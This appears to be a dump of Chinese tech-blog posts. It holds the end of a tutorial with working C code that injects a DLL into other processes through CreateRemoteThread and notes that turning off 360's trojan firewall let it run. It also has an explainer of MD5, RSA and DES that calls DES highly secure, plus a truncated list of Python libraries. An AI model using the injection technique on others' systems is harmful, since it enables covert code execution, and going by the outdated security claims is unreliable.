//获得远程进程中LoadLibrary()的地址 LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(“kernel32.dll”)), “LoadLibraryA”); if (pLoadLibrary == NULL) { printf(“GetProcAddress error\\n”); return -5; } else { printf(“LoadLibrary’s Address is 0x%x\\n\\n”, pLoadLibrary); } //启动远程线程 DWORD dwThreadId; HANDLE hThread; if ((hThread = CreateRemoteThread(hRemoteProcess, NULL, 0, pLoadLibrary, pRemoteDllPath, 0, &amp;dwThreadId)) == NULL) { printf(“CreateRemoteThread error\\n”); return -6; } else { WaitForSingleObject(hThread, INFINITE); printf(“dwThreadId is %d\\n\\n”, dwThreadId); printf(“Inject is done\\n”); } //释放分配内存 if (VirtualFreeEx(hRemoteProcess, pRemoteDllPath, 0, MEM_RELEASE) == 0) { printf(“VitualFreeEx error\\n”); return -8; } //释放句柄 if (hThread != NULL) CloseHandle(hThread); if (hRemoteProcess != NULL) CloseHandle(hRemoteProcess); system(“pause”); return 0; } 六、运行测试 １.向记事本进程注入DLL 这里输出了一些数据作为调试时查看的参考，可以看到写入的DLL路径 这是DLL加载进远程进程地址空间时的DLL_PROCESS_ATTACH提示 这是远程线程创建时的DLL_THREAD_ATTACH提示 这是远程线程退出时DLL_THREAD_DETACH提示 查看此时记事本进程中的ＤＬＬ模块 此时没有弹出DLL_PROCESS_DETACH提示，因为我们的DLL还存在于记事本进程中，关闭记事本 ２.向自身进程注入 在实际编写时，常常会出现各种各样的问题而弄不清原因在本地进程还是远程进程。因而我们设定当输入的进程ＩＤ为０时，向自身进程注入ＤＬＬ 然而当最后结束的时候却会出现错误： 在网上查询可以知道这种错误常常是由于杀毒软件或者防火墙造成的，关闭360木马防火墙后运行正常： 3.向其他进程注入 l 向Kugoo7.exe注入会弹出360提示，允许后注入成功，之后正常退出，Kugoo7正常运行 有意思的发现是，由于我们没有卸载Kugou7中的注入的DLL，因而在Kugou7播放的过程中时不时弹出创建线程的消息框提示，可见Kugou7本身在播放音乐的过程中也在不断创建、释放线程。 l 向搜狗输入法注入，依然是360弹出提示，允许后成功 仔细观察发现上面360弹出警告的程序点都在源码调用CreateRemoteThread()的时间点，可见360对该API进行了检测。 l 当向进程查看工具IceSword1.22注入时，在调用OpenProcess()时失败，提示内存分配访问无效，估计是设定了更高的访问权限，使得Ring3级别的访问基本都无效","tags":""},{"title":"3个著名加密算法(MD5、RSA、DES)的解析","url":"/20240322/3-ge-zhu-ming-jia-mi-suan-fa-md5-rsa-des-de-jie-xi/","text":"转载自 3个著名加密算法(MD5、RSA、DES)的解析 MD5的全称是Message-Digest Algorithm 5，在90年代初由MIT的计算机科学实验室和RSA Data Security Inc发明，经MD2、MD3和MD4发展而来。 MD5将任意长度的“字节串”变换成一个128bit的大整数，并且它是一个不可逆的字符串变换算法，换句话说就是，即使你看到源程序和算法描述，也无法将一个MD5的值变换回原始的字符串，从数学原理上说，是因为原始的字符串有无穷多个，这有点象不存在反函数的数学函数。 MD5的典型应用是对一段Message(字节串)产生fingerprint(指纹)，以防止被“篡改”。举个例子，你将一段话写在一个叫 readme.txt文件中，并对这个readme.txt产生一个MD5的值并记录在案，然后你可以传播这个文件给别人，别人如果修改了文件中的任何内容，你对这个文件重新计算MD5时就会发现。如果再有一个第三方的认证机构，用MD5还可以防止文件作者的“抵赖”，这就是所谓的数字签名应用。 MD5还广泛用于加密和解密技术上，在很多操作系统中，用户的密码是以MD5值（或类似的其它算法）的方式保存的， 用户Login的时候，系统是把用户输入的密码计算成MD5值，然后再去和系统中保存的MD5值进行比较，而系统并不“知道”用户的密码是什么。 RSA是第一个既能用于数据加密也能用于数字签名的算法。它易于理解和操作，也很流行。算法的名字以发明者的名字命名：Ron Rivest, Adi Shamir 和Leonard Adleman。但RSA的安全性一直未能得到理论上的证明。它经历了各种攻击，至今未被完全攻破。 DES算法 美国国家标准局1973年开始研究除国防部外的其它部门的计算机系统的数据加密标准，于1973年5月15日和1974年8月27日先后两次向公众发出了征求加密算法的公告。 1977年1月，美国政府颁布：采纳IBM公司设计的方案作为非机密数据的正式数据加密标准（DES?Data Encryption Standard）。 1.加密算法之MD5算法 在一些初始化处理后，MD5以512位分组来处理输入文本，每一分组又划分为16个32位子分组。算法的输出由四个32位分组组成，将它们级联形成一个128位散列值。 首先填充消息使其长度恰好为一个比512位的倍数仅小64位的数。填充方法是附一个1在消息后面，后接所要求的多个0，然后在其后附上64位的消息长度（填充前）。这两步的作用是使消息长度恰好是512位的整数倍（算法的其余部分要求如此），同时确保不同的消息在填充后不相同。 四个32位变量初始化为： A=0x01234567 B=0x89abcdef C=0xfedcba98 D=0x76543210 它们称为链接变量（chaining variable） 接着进行算法的主循环，循环的次数是消息中512位消息分组的数目。 将上面四个变量复制到别外的变量中：A到a，B到b，C到c，D到d。 主循环有四轮（MD4只有三轮），每轮很相拟。第一轮进行16次操作。每次操作对a，b，c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向右环移一个不定的数，并加上a，b，c或d中之一。最后用该结果取代a，b，c或d中之一。 以一下是每次操作中用到的四个非线性函数（每轮一个）。 F(X,Y,Z)=(X&amp;Y)|((~X)&amp;Z) G(X,Y,Z)=(X&amp;Z)|(Y&amp;(~Z)) H(X,Y,Z)=XYZ I(X,Y,Z)=Y^(X|(~Z)) (&amp;是与,|是或,~是非,^是异或) 这些函数是这样设计的：如果X、Y和Z的对应位是独立和均匀的，那么结果的每一位也应是独立和均匀的。 函数F是按逐位方式操作：如果X，那么Y，否则Z。函数H是逐位奇偶操作符。 设Mj表示消息的第j个子分组（从0到15），&lt;&lt;&lt; s表示循环左移s位，则四种操作为： FF(a,b,c,d,Mj,s,ti)表示a=b+((a+(F(b,c,d)+Mj+ti)&lt;&lt;&lt; s) GG(a,b,c,d,Mj,s,ti)表示a=b+((a+(G(b,c,d)+Mj+ti)&lt;&lt;&lt; s) HH(a,b,c,d,Mj,s,ti)表示a=b+((a+(H(b,c,d)+Mj+ti)&lt;&lt;&lt; s) II(a,b,c,d,Mj,s,ti)表示a=b+((a+(I(b,c,d)+Mj+ti)&lt;&lt;&lt; s) 这四轮（64步）是： 第一轮 FF(a,b,c,d,M0,7,0xd76aa478) FF(d,a,b,c,M1,12,0xe8c7b756) FF(c,d,a,b,M2,17,0x242070db) FF(b,c,d,a,M3,22,0xc1bdceee) FF(a,b,c,d,M4,7,0xf57c0faf) FF(d,a,b,c,M5,12,0x4787c62a) FF(c,d,a,b,M6,17,0xa8304613) FF(b,c,d,a,M7,22,0xfd469501) FF(a,b,c,d,M8,7,0x698098d8) FF(d,a,b,c,M9,12,0x8b44f7af) FF(c,d,a,b,M10,17,0xffff5bb1) FF(b,c,d,a,M11,22,0x895cd7be) FF(a,b,c,d,M12,7,0x6b901122) FF(d,a,b,c,M13,12,0xfd987193) FF(c,d,a,b,M14,17,0xa679438e) FF(b,c,d,a,M15,22,0x49b40821) 第二轮 GG(a,b,c,d,M1,5,0xf61e2562) GG(d,a,b,c,M6,9,0xc040b340) GG(c,d,a,b,M11,14,0x265e5a51) GG(b,c,d,a,M0,20,0xe9b6c7aa) GG(a,b,c,d,M5,5,0xd62f105d) GG(d,a,b,c,M10,9,0x02441453) GG(c,d,a,b,M15,14,0xd8a1e681) GG(b,c,d,a,M4,20,0xe7d3fbc8) GG(a,b,c,d,M9,5,0x21e1cde6) GG(d,a,b,c,M14,9,0xc33707d6) GG(c,d,a,b,M3,14,0xf4d50d87) GG(b,c,d,a,M8,20,0x455a14ed) GG(a,b,c,d,M13,5,0xa9e3e905) GG(d,a,b,c,M2,9,0xfcefa3f8) GG(c,d,a,b,M7,14,0x676f02d9) GG(b,c,d,a,M12,20,0x8d2a4c8a) 第三轮 HH(a,b,c,d,M5,4,0xfffa3942) HH(d,a,b,c,M8,11,0x8771f681) HH(c,d,a,b,M11,16,0x6d9d6122) HH(b,c,d,a,M14,23,0xfde5380c) HH(a,b,c,d,M1,4,0xa4beea44) HH(d,a,b,c,M4,11,0x4bdecfa9) HH(c,d,a,b,M7,16,0xf6bb4b60) HH(b,c,d,a,M10,23,0xbebfbc70) HH(a,b,c,d,M13,4,0x289b7ec6) HH(d,a,b,c,M0,11,0xeaa127fa) HH(c,d,a,b,M3,16,0xd4ef3085) HH(b,c,d,a,M6,23,0x04881d05) HH(a,b,c,d,M9,4,0xd9d4d039) HH(d,a,b,c,M12,11,0xe6db99e5) HH(c,d,a,b,M15,16,0x1fa27cf8) HH(b,c,d,a,M2,23,0xc4ac5665) 第四轮 II(a,b,c,d,M0,6,0xf4292244) II(d,a,b,c,M7,10,0x432aff97) II(c,d,a,b,M14,15,0xab9423a7) II(b,c,d,a,M5,21,0xfc93a039) II(a,b,c,d,M12,6,0x655b59c3) II(d,a,b,c,M3,10,0x8f0ccc92) II(c,d,a,b,M10,15,0xffeff47d) II(b,c,d,a,M1,21,0x85845dd1) II(a,b,c,d,M8,6,0x6fa87e4f) II(d,a,b,c,M15,10,0xfe2ce6e0) II(c,d,a,b,M6,15,0xa3014314) II(b,c,d,a,M13,21,0x4e0811a1) II(a,b,c,d,M4,6,0xf7537e82) II(d,a,b,c,M11,10,0xbd3af235) II(c,d,a,b,M2,15,0x2ad7d2bb) II(b,c,d,a,M9,21,0xeb86d391) 常数ti可以如下选择： 在第i步中，ti是4294967296*abs(sin(i))的整数部分,i的单位是弧度。 (2的32次方) 所有这些完成之后，将A，B，C，D分别加上a，b，c，d。然后用下一分组数据继续运行算法，最后的输出是A，B，C和D的级联。 MD5的安全性 MD5相对MD4所作的改进： 1.增加了第四轮. 2.每一步均有唯一的加法常数. 3.为减弱第二轮中函数G的对称性从(X&amp;Y)|(X&amp;Z)|(Y&amp;Z)变为(X&amp;Z)|(Y&amp;(~Z)) 4.第一步加上了上一步的结果,这将引起更快的雪崩效应. 5.改变了第二轮和第三轮中访问消息子分组的次序,使其更不相似. 6.近似优化了每一轮中的循环左移位移量以实现更快的雪崩效应.各轮的位移量互不相同. 2.加密算法之RSA算法 它是第一个既能用于数据加密也能用于数字签名的算法。它易于理解和操作，也很流行。算法的名字以发明者的名字命名：Ron Rivest, Adi Shamir 和Leonard Adleman。但RSA的安全性一直未能得到理论上的证明。它经历了各种攻击，至今未被完全攻破。 一、RSA算法 : 首先, 找出三个数, p, q, r, 其中 p, q 是两个相异的质数, r 是与 (p-1)(q-1) 互质的数… p, q, r 这三个数便是 private key 接著, 找出 m, 使得 rm == 1 mod (p-1)(q-1)… 这个 m 一定存在, 因为 r 与 (p-1)(q-1) 互质, 用辗转相除法就可以得到了… 再来, 计算 n = pq… m, n 这两个数便是 public key 编码过程是, 若资料为 a, 将其看成是一个大整数, 假设 a &lt; n… 如果 a &gt;= n 的话, 就将 a 表成 s 进位 (s &lt;= n, 通常取 s = 2^t), 则每一位数均小於 n, 然後分段编码… 接下来, 计算 b == a^m mod n, (0 &lt;= b &lt; n), b 就是编码後的资料… 解码的过程是, 计算 c == b^r mod pq (0 &lt;= c &lt; pq), 於是乎, 解码完毕… 等会会证明 c 和 a 其实是相等的 如果第三者进行窃听时, 他会得到几个数: m, n(=pq), b… 他如果要解码的话, 必须想办法得到 r… 所以, 他必须先对 n 作质因数分解… 要防止他分解, 最有效的方法是找两个非常的大质数 p, q, 使第三者作因数分解时发生困难… &lt;定理&gt; 若 p, q 是相异质数, rm == 1 mod (p-1)(q-1), a 是任意一个正整数, b == a^m mod pq, c == b^r mod pq, 则 c == a mod pq 证明的过程, 会用到费马小定理, 叙述如下: m 是任一质数, n 是任一整数, 则 n^m == n mod m (换另一句话说, 如果 n 和 m 互质, 则 n^(m-1) == 1 mod m) 运用一些基本的群论的知识, 就可以很容易地证出费马小定理的… &lt;证明&gt; 因为 rm == 1 mod (p-1)(q-1), 所以 rm = k(p-1)(q-1) + 1, 其中 k 是整数 因为在 modulo 中是 preserve 乘法的 (x == y mod z and u == v mod z =&gt; xu == yv mod z), 所以, c == b^r == (am)r == a^(rm) == a^(k(p-1)(q-1)+1) mod pq 1. 如果 a 不是 p 的倍数, 也不是 q 的倍数时, 则 a^(p-1) == 1 mod p (费马小定理) =&gt; a^(k(p-1)(q-1)) == 1 mod p a^(q-1) == 1 mod q (费马小定理) =&gt; a^(k(p-1)(q-1)) == 1 mod q 所以 p, q 均能整除 a^(k(p-1)(q-1)) - 1 =&gt; pq | a^(k(p-1)(q-1)) - 1 即 a^(k(p-1)(q-1)) == 1 mod pq =&gt; c == a^(k(p-1)(q-1)+1) == a mod pq 2. 如果 a 是 p 的倍数, 但不是 q 的倍数时, 则 a^(q-1) == 1 mod q (费马小定理) =&gt; a^(k(p-1)(q-1)) == 1 mod q =&gt; c == a^(k(p-1)(q-1)+1) == a mod q =&gt; q | c - a 因 p | a =&gt; c == a^(k(p-1)(q-1)+1) == 0 mod p =&gt; p | c - a 所以, pq | c - a =&gt; c == a mod pq 3. 如果 a 是 q 的倍数, 但不是 p 的倍数时, 证明同上 4. 如果 a 同时是 p 和 q 的倍数时, 则 pq | a =&gt; c == a^(k(p-1)(q-1)+1) == 0 mod pq =&gt; pq | c - a =&gt; c == a mod pq Q.E.D. 这个定理说明 a 经过编码为 b 再经过解码为 c 时, a == c mod n (n = pq)… 但我们在做编码解码时, 限制 0 &lt;= a &lt; n, 0 &lt;= c &lt; n, 所以这就是说 a 等於 c, 所以这个过程确实能做到编码解码的功能… 二、RSA 的安全性 RSA的安全性依赖于大数分解，但是否等同于大数分解一直未能得到理论上的证明，因为没有证明破解 RSA就一定需要作大数分解。假设存在一种无须分解大数的算法，那它肯定可以修改成为大数分解算法。目前， RSA 的一些变种算法已被证明等价于大数分解。不管怎样，分解n是最显然的攻击方法。现在，人们已能分解多个十进制位的大素数。因此，模数n 必须选大一些，因具体适用情况而定。 三、RSA的速度 由于进行的都是大数计算，使得RSA最快的情况也比DES慢上倍，无论是软件还是硬件实现。速度一直是RSA的缺陷。一般来说只用于少量数据加密。 四、RSA的选择密文攻击 RSA在选择密文攻击面前很脆弱。一般攻击者是将某一信息作一下伪装( Blind)，让拥有私钥的实体签署。然后，经过计算就可得到它所想要的信息。实际上，攻击利用的都是同一个弱点，即存在这样一个事实：乘幂保留了输入的乘法结构： ( XM )^d = X^d *M^d mod n 前面已经提到，这个固有的问题来自于公钥密码系统的最有用的特征–每个人都能使用公钥。但从算法上无法解决这一问题，主要措施有两条：一条是采用好的公钥协议，保证工作过程中实体不对其他实体任意产生的信息解密，不对自己一无所知的信息签名；另一条是决不对陌生人送来的随机文档签名，签名时首先使用One-Way HashFunction 对文档作HASH处理，或同时使用不同的签名算法。在中提到了几种不同类型的攻击方法。 五、RSA的公共模数攻击 若系统中共有一个模数，只是不同的人拥有不同的e和d，系统将是危险的。最普遍的情况是同一信息用不同的公钥加密，这些公钥共模而且互质，那末该信息无需私钥就可得到恢复。设P为信息明文，两个加密密钥为e1和e2，公共模数是n，则： C1 = P^e1 mod n C2 = P^e2 mod n 密码分析者知道n、e1、e2、C1和C2，就能得到P。 因为e1和e2互质，故用Euclidean算法能找到r和s，满足： r * e1 + s * e2 = 1 假设r为负数，需再用Euclidean算法计算C1^(-1)，则 ( C1^(-1) )^(-r) * C2^s = P mod n 另外，还有其它几种利用公共模数攻击的方法。总之，如果知道给定模数的一对e和d，一是有利于攻击者分解模数，一是有利于攻击者计算出其它成对的e’和d’，而无需分解模数。解决办法只有一个，那就是不要共享模数n。 RSA的小指数攻击。 有一种提高 RSA速度的建议是使公钥e取较小的值，这样会使加密变得易于实现，速度有 所提高。但这样作是不安全的，对付办法就是e和d都取较大的值。 RSA算法是第一个能同时用于加密和数字签名的算法，也易于理解和操作。RSA是被研究得最广泛的公钥算法，从提出到现在已近二十年，经历了各种攻击的考验，逐渐为人们接受，普遍认为是目前最优秀的公钥方案之一。RSA的安全性依赖于大数的因子分解，但并没有从理论上证明破译RSA的难度与大数分解难度等价。即RSA的重大缺陷是无法从理论上把握它的保密性能如何，而且密码学界多数人士倾向于因子分解不是NPC问题。 RSA的缺点主要有：A)产生密钥很麻烦，受到素数产生技术的限制，因而难以做到一次一密。B)分组长度太大，为保证安全性，n 至少也要 600 bits 以上，使运算代价很高，尤其是速度较慢，较对称密码算法慢几个数量级；且随着大数分解技术的发展，这个长度还在增加，不利于数据格式的标准化。目前，SET( Secure Electronic Transaction )协议中要求CA采用比特长的密钥，其他实体使用比特的密钥。 3.加密算法之DES算法 一、DES算法 美国国家标准局1973年开始研究除国防部外的其它部门的计算机系统的数据加密标准，于1973年5月15日和1974年8月27日先后两次向公众发出了征求加密算法的公告。加密算法要达到的目的（通常称为DES 密码算法要求）主要为以下四点： ☆提供高质量的数据保护，防止数据未经授权的泄露和未被察觉的修改； ☆具有相当高的复杂性，使得破译的开销超过可能获得的利益，同时又要便于理解和掌握； ☆DES密码体制的安全性应该不依赖于算法的保密，其安全性仅以加密密钥的保密为基础； ☆实现经济，运行有效，并且适用于多种完全不同的应用。 1977年1月，美国政府颁布：采纳IBM公司设计的方案作为非机密数据的正式数据加密标准（DES?Data Encryption Standard）。 目前在国内，随着三金工程尤其是金卡工程的启动，DES算法在POS、ATM、磁卡及智能卡（IC卡）、加油站、高速公路收费站等领域被广泛应用，以此来实现关键数据的保密，如信用卡持卡人的PIN的加密传输，IC卡与POS间的双向认证、金融交易数据包的MAC校验等，均用到DES算法。 DES算法的入口参数有三个：Key、Data、Mode。其中Key为8个字节共64位，是DES算法的工作密钥；Data也为8个字节64位，是要被加密或被解密的数据；Mode为DES的工作方式，有两种：加密或解密。 DES算法是这样工作的：如Mode为加密，则用Key 去把数据Data进行加密， 生成Data的密码形式（64位）作为DES的输出结果；如Mode为解密，则用Key去把密码形式的数据Data解密，还原为Data的明码形式（64位）作为DES的输出结果。在通信网络的两端，双方约定一致的Key，在通信的源点用Key对核心数据进行DES加密，然后以密码形式在公共通信网（如电话网）中传输到通信网络的终点，数据到达目的地后，用同样的Key对密码数据进行解密，便再现了明码形式的核心数据。这样，便保证了核心数据（如PIN、MAC等）在公共通信网中传输的安全性和可靠性。 通过定期在通信网络的源端和目的端同时改用新的Key，便能更进一步提高数据的保密性，这正是现在金融交易网络的流行做法。 DES算法详述 DES算法把64位的明文输入块变为64位的密文输出块，它所使用的密钥也是64位，整个算法的主流程图如下： 其功能是把输入的64位数据块按位重新组合，并把输出分为L0、R0两部分，每部分各长32位，其置换规则见下表： 58,50,12,34,26,18,10,2,60,52,44,36,28,20,12,4, 62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8, 57,49,41,33,25,17, 9,1,59,51,43,35,27,19,11,3, 61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7, 即将输入的第58位换到第一位，第50位换到第2位，…，依此类推，最后一位是原来的第7位。L0、R0则是换位输出后的两部分，L0是输出的左32位，R0 是右32位，例：设置换前的输入值为D1D2D3…D64，则经过初始置换后的结果为：L0=D58D50…D8；R0=D57D49…D7。 经过16次迭代运算后。得到L16、R16，将此作为输入，进行逆置换，即得到密文输出。逆置换正好是初始置的逆运算，例如，第1位经过初始置换后，处于第40位，而通过逆置换，又将第40位换回到第1位，其逆置换规则如下表所示： 40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31, 38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29, 36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27, 34,2,42,10,50,18,58 26,33,1,41, 9,49,17,57,25, 放大换位表 32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10,11, 12,13,12,13,14,15,16,17,16,17,18,19,20,21,20,21, 22,23,24,25,24,25,26,27,28,29,28,29,30,31,32, 1, 单纯换位表 16,7,20,21,29,12,28,17, 1,15,23,26, 5,18,31,10, 2,8,24,14,32,27, 3, 9,19,13,30, 6,22,11, 4,25, 在f(Ri,Ki)算法描述图中，S1,S2…S8为选择函数，其功能是把6bit数据变为4bit数据。下面给出选择函数Si(i=1,2…的功能表： 选择函数Si S1: 14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7, 0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8, 4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0, 15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13, S2: 15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10, 3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5, 0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15, 13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9, S3: 10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8, 13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1, 13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7, 1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12, S4: 7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15, 13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9, 10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4, 3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14, S5: 2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9, 14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6, 4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14, 11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3, S6: 12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11, 10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8, 9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6, 4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13, S7: 4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1, 13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6, 1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2, 6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12, S8: 13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7, 1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2, 7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8, 2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11, 在此以S1为例说明其功能，我们可以看到：在S1中，共有4行数据，命名为0，1、2、3行；每行有16列，命名为0、1、2、3，…，14、15列。 现设输入为： D＝D1D2D3D4D5D6 令：列＝D2D3D4D5 行＝D1D6 然后在S1表中查得对应的数，以4位二进制表示，此即为选择函数S1的输出。下面给出子密钥Ki(48bit)的生成算法 从子密钥Ki的生成算法描述图中我们可以看到：初始Key值为64位，但DES算法规定，其中第8、16、…64位是奇偶校验位，不参与DES运算。故Key 实际可用位数便只有56位。即：经过缩小选择换位表1的变换后，Key 的位数由64 位变成了56位，此56位分为C0、D0两部分，各28位，然后分别进行第1次循环左移，得到C1、D1，将C1（28位）、D1（28位）合并得到56位，再经过缩小选择换位2，从而便得到了密钥K0（48位）。依此类推，便可得到K1、K2、…、K15，不过需要注意的是，16次循环左移对应的左移位数要依据下述规则进行： 循环左移位数 1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1 以上介绍了DES算法的加密过程。DES算法的解密过程是一样的，区别仅仅在于第一次迭代时用子密钥K15，第二次K14、…，最后一次用K0，算法本身并没有任何变化。 二、DES算法理论图解 DES的算法是对称的，既可用于加密又可用于解密。下图是它的算法粗框图。其具体运算过程有如下七步。 ＜缺：找到补上＞ 三、DES算法的应用误区 DES算法具有极高安全性，到目前为止，除了用穷举搜索法对DES算法进行攻击外，还没有发现更有效的办法。而56位长的密钥的穷举空间为256，这意味着如果一台计算机的速度是每一秒种检测一百万个密钥，则它搜索完全部密钥就需要将近2285年的时间，可见，这是难以实现的，当然，随着科学技术的发展，当出现超高速计算机后，我们可考虑把DES密钥的长度再增长一些，以此来达到更高的保密程度。 由上述DES算法介绍我们可以看到：DES算法中只用到64位密钥中的其中56位，而第8、16、24、…64位8个位并未参与DES运算，这一点，向我们提出了一个应用上的要求，即DES的安全性是基于除了8，16，24，…64位外的其余56位的组合变化256才得以保证的。因此，在实际应用中，我们应避开使用第8，16，24，…64位作为有效数据位，而使用其它的56位作为有效数据位，才能保证DES算法安全可靠地发挥作用。如果不了解这一点，把密钥Key的8，16，24，… .64位作为有效数据使用，将不能保证DES加密数据的安全性，对运用DES来达到保密作用的系统产生数据被破译的危险，这正是DES算法在应用上的误区，留下了被人攻击、被人破译的极大隐患。","tags":""},{"title":"Python 网页爬虫 & 文本处理 & 科学计算 & 机器学习 & 数据挖掘兵器谱","url":"/20240322/python-wang-ye-pa-chong-wen-ben-chu-li-ke-xue-ji-suan-ji-qi-xue-xi-shu-ju-wa-jue-bing-qi-pu/","text":"转载自Python 网页爬虫 &amp; 文本处理 &amp; 科学计算 &amp; 机器学习 &amp; 数据挖掘兵器谱 曾经因为NLTK的缘故开始学习Python，之后渐渐成为我工作中的第一辅助脚本语言，虽然开发语言是C/C++，但平时的很多文本数据处理任务都交给了Python。离开腾讯创业后，第一个作品课程图谱也是选择了Python系的Flask框架，渐渐的将自己的绝大部分工作交给了Python。这些年来，接触和使用了很多Python工具包，特别是在文本处理，科学计算，机器学习和数据挖掘领域，有很多很多优秀的Python工具包可供使用，所以作为Pythoner，也是相当幸福的。其实如果仔细留意微博，你会发现很多这方面的分享，自己也Google了一下，发现也有同学总结了“Python机器学习库”，不过总感觉缺少点什么。最近流行一个词，全栈工程师（full stack engineer），作为一个苦逼的创业者，天然的要把自己打造成一个full stack engineer，而这个过程中，这些Python工具包给自己提供了足够的火力，所以想起了这个系列。当然，这也仅仅是抛砖引玉，希望大家能提供更多的线索，来汇总整理一套Python网页爬虫，文本处理，科学计算，机器学习和数据挖掘的兵器谱。 一、Python网页爬虫工具集 一个真实的项目，一定是从获取数据开始的。无论文本处理，机器学习和数据挖掘，都需要数据，除了通过一些渠道购买或者下载的专业数据外，常常需要大家自己动手爬数据，这个时候，爬虫就显得格外重要了，幸好，Python提供了一批很不错的网页爬虫工具框架，既能爬取数据，也能获取和清洗数据，我们也就从这里开始了： 1. Scrapy Scrapy, a fast high-level screen scraping and web crawling framework for Python. 鼎鼎大名的Scrapy，相信不少同学都有耳闻，课程图谱中的很多课程都是依靠Scrapy抓去的，这方面的介绍文章有很多，推荐大牛pluskid早年的一篇文章：《Scrapy 轻松定制网络爬虫》，历久弥新。 官方主页：http://scrapy.org/ Github代码页: https://github.com/scrapy/scrapy 2. Beautiful Soup You didn’t write that awful page. You’re just trying to get some data out of it. Beautiful Soup is here to help. Since 2004, it’s been saving programmers hours or days of work on quick-turnaround screen scraping projects. 读书的时候通过《集体智慧编程》这本书知道Beautiful Soup的，后来也偶尔会用用，非常棒的一套工具。客观的说，Beautifu Soup不完全是一套爬虫工具，需要配合urllib使用，而是一套HTML/XML数据分析，清洗和获取工具。 官方主页：http://www.crummy.com/software/BeautifulSoup/ 3. Python-Goose Html Content / Article Extractor, web scrapping lib in Python Goose最早是用Java写得，后来用Scala重写，是一个Scala项目。Python-Goose用Python重写，依赖了Beautiful Soup。前段时间用过，感觉很不错，给定一个文章的URL, 获取文章的标题和内容很方便。 Github主页：https://github.com/grangier/python-goose 二、Python文本处理工具集 从网页上获取文本数据之后，依据任务的不同，就需要进行基本的文本处理了，譬如对于英文来说，需要基本的tokenize，对于中文，则需要常见的中文分词，进一步的话，无论英文中文，还可以词性标注，句法分析，关键词提取，文本分类，情感分析等等。这个方面，特别是面向英文领域，有很多优秀的工具包，我们一一道来。 1. NLTK – Natural Language Toolkit NLTK is a leading platform for building Python programs to work with human language data. It provides easy-to-use interfaces to over 50 corpora and lexical resources such as WordNet, along with a suite of text processing libraries for classification, tokenization, stemming, tagging, parsing, and semantic reasoning, and an active discussion forum. 搞自然语言处理的同学应该没有人不知道NLTK吧，这里也就不多说了。不过推荐两本书籍给刚刚接触NLTK或者需要详细了解NLTK的同学: 一个是官方的《Natural Language Processing with Python》，以介绍NLTK里的功能用法为主，同时附带一些Python知识，同时国内陈涛同学友情翻译了一个中文版，这里可以看到：推荐《用Python进行自然语言处理》中文翻译-NLTK配套书；另外一本是《Python Text Processing with NLTK 2.0 Cookbook》，这本书要深入一些，会涉及到NLTK的代码结构，同时会介绍如何定制自己的语料和模型等，相当不错。 官方主页：http://www.nltk.org/ Github代码页：https://github.com/nltk/nltk 2. Pattern Pattern is a web mining module for the Python programming language. It has tools for data mining (Google, Twitter and Wikipedia API, a web crawler, a HTML DOM parser), natural language processing (part-of-speech taggers, n-gram search, sentiment analysis, WordNet), machine learning (vector space model, clustering, SVM), network analysis and canvas visualization. Pattern由比利时安特卫普大学CLiPS实验室出品，客观的说，Pattern不仅仅是一套文本处理工具，它更是一套web数据挖掘工具，囊括了数据抓取模块（包括Google, Twitter, 维基百科的API，以及爬虫和HTML分析器），文本处理模块（词性标注，情感分析等），机器学习模块(VSM, 聚类，SVM）以及可视化模块等，可以说，Pattern的这一整套逻辑也是这篇文章的组织逻辑，不过这里我们暂且把Pattern放到文本处理部分。我个人主要使用的是它的英文处理模块Pattern.en, 有很多很不错的文本处理功能，包括基础的tokenize, 词性标注，句子切分，语法检查，拼写纠错，情感分析，句法分析等，相当不错。 官方主页：http://www.clips.ua.ac.be/pattern 3. TextBlob: Simplified Text Processing TextBlob is a Python (2 and 3) library for processing textual data. It provides a simple API for diving into common natural language processing (NLP) tasks such as part-of-speech tagging, noun phrase extraction, sentiment analysis, classification, translation, and more. TextBlob是一个很有意思的Python文本处理工具包，它其实是基于上面两个Python工具包NLKT和Pattern做了封装（TextBlob stands on the giant shoulders of NLTK and pattern, and plays nicely with 